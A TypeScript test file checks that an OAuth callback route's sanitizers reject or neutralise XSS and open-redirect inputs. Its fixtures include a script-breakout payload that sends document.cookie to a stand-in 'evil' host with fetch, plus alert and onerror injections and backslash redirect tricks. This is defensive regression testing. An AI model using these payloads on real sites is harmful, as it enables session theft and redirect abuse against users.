import { describe, expect, it } from "vitest";

import {
  buildHashForwardHtml,
  escapeHtmlAttribute,
  sanitizeErrorCode,
  sanitizeNextPath,
} from "./oauthCallback";

// The payload from the security audit (docs/audit-2026-07-27.md, 3.0). The
// old route validated `next` as "starts with /, not //", which this passes,
// then interpolated it into a <script> body via JSON.stringify -- which does
// not escape `</script>`, so it broke out of the script element and ran.
const XSS_NEXT = "/a</script><script>fetch('//evil/'+document.cookie)</script>";
const XSS_ERROR_CODE = "</script><script>alert(1)</script>";

describe("sanitizeNextPath", () => {
  it("passes through the real routes the app actually sends", () => {
    for (const path of ["/daily", "/infinite", "/online", "/how-to-play", "/privacy-policy", "/"]) {
      expect(sanitizeNextPath(path)).toBe(path);
    }
  });

  it("rejects the script-breakout payload", () => {
    expect(sanitizeNextPath(XSS_NEXT)).toBe("/daily");
  });

  it("rejects protocol-relative open redirects, including the backslash form", () => {
    // `/\evil.com` passes a startsWith("//") check but the WHATWG URL parser
    // treats `\` as `/` for special schemes, so location.replace() navigates
    // off-site. This is the bug a `//`-only check misses.
    expect(sanitizeNextPath("/\\evil.com")).toBe("/daily");
    expect(sanitizeNextPath("//evil.com")).toBe("/daily");
    expect(sanitizeNextPath("/\\/evil.com")).toBe("/daily");
  });

  it("rejects absolute URLs, traversal, embedded query/fragment and control characters", () => {
    expect(sanitizeNextPath("https://evil.com")).toBe("/daily");
    expect(sanitizeNextPath("/daily/../../etc")).toBe("/daily");
    expect(sanitizeNextPath("/daily?next=/x")).toBe("/daily");
    expect(sanitizeNextPath("/daily#frag")).toBe("/daily");
    expect(sanitizeNextPath("/daily\n/x")).toBe("/daily");
    expect(sanitizeNextPath("/dai ly")).toBe("/daily");
  });

  it("falls back for missing or oversized input", () => {
    expect(sanitizeNextPath(null)).toBe("/daily");
    expect(sanitizeNextPath(undefined)).toBe("/daily");
    expect(sanitizeNextPath("")).toBe("/daily");
    expect(sanitizeNextPath(`/${"a".repeat(600)}`)).toBe("/daily");
  });
});

describe("sanitizeErrorCode", () => {
  it("passes through real GoTrue codes", () => {
    expect(sanitizeErrorCode("identity_already_exists")).toBe("identity_already_exists");
    expect(sanitizeErrorCode("validation_failed")).toBe("validation_failed");
  });

  it("rejects markup and anything outside the identifier charset", () => {
    expect(sanitizeErrorCode(XSS_ERROR_CODE)).toBe("oauth_callback_failed");
    expect(sanitizeErrorCode('" onerror="alert(1)')).toBe("oauth_callback_failed");
    expect(sanitizeErrorCode("a".repeat(65))).toBe("oauth_callback_failed");
    expect(sanitizeErrorCode(null)).toBe("oauth_callback_failed");
  });
});

describe("escapeHtmlAttribute", () => {
  it("escapes every character that could close an attribute or a tag", () => {
    expect(escapeHtmlAttribute(`<>&"'`)).toBe("&lt;&gt;&amp;&quot;&#39;");
  });

  it("escapes the ampersand first so entities are not double-broken", () => {
    expect(escapeHtmlAttribute("&lt;")).toBe("&amp;lt;");
  });
});

describe("buildHashForwardHtml", () => {
  const nonce = "test-nonce";

  it("emits exactly one script element terminator", () => {
    // The whole class of bug: any extra `</script` in the output means a
    // value escaped its element. Holds for hostile input because sanitizing
    // runs first, and for raw input because of attribute escaping.
    const html = buildHashForwardHtml({ next: "/daily", errorCode: "oauth_callback_failed", nonce });
    expect(html.match(/<\/script/gi)).toHaveLength(1);
  });

  it("keeps injected markup inert even if it reaches the builder unsanitized", () => {
    const html = buildHashForwardHtml({ next: XSS_NEXT, errorCode: XSS_ERROR_CODE, nonce });

    // The payload's characters survive as escaped attribute *text* -- what
    // must not survive is any of it parsing as markup. One script element
    // in, one script element out.
    expect(html.match(/<script/gi)).toHaveLength(1);
    expect(html.match(/<\/script/gi)).toHaveLength(1);
    expect(html).toContain("&lt;/script&gt;");
    // No unescaped delimiter left to close the attribute or the tag.
    expect(html).not.toContain("<script>alert(1)");
    expect(html).not.toContain("fetch('");
  });

  it("carries the sanitized values as data attributes, not as script source", () => {
    const html = buildHashForwardHtml({ next: "/online", errorCode: "identity_already_exists", nonce });

    expect(html).toContain('data-next="/online"');
    expect(html).toContain('data-fallback-code="identity_already_exists"');
    expect(html).toContain(`nonce="${nonce}"`);
    // The script reads its inputs at runtime; neither value appears inside
    // the script body itself.
    const scriptBody = html.slice(html.indexOf(">", html.indexOf("<script")), html.indexOf("</script"));
    expect(scriptBody).not.toContain("/online");
    expect(scriptBody).not.toContain("identity_already_exists");
  });

  it("forwards the hash-only `error` key as well as `error_code`", () => {
    const html = buildHashForwardHtml({ next: "/daily", errorCode: "oauth_callback_failed", nonce });
    expect(html).toContain('hashParams.get("error_code") || hashParams.get("error")');
  });
});
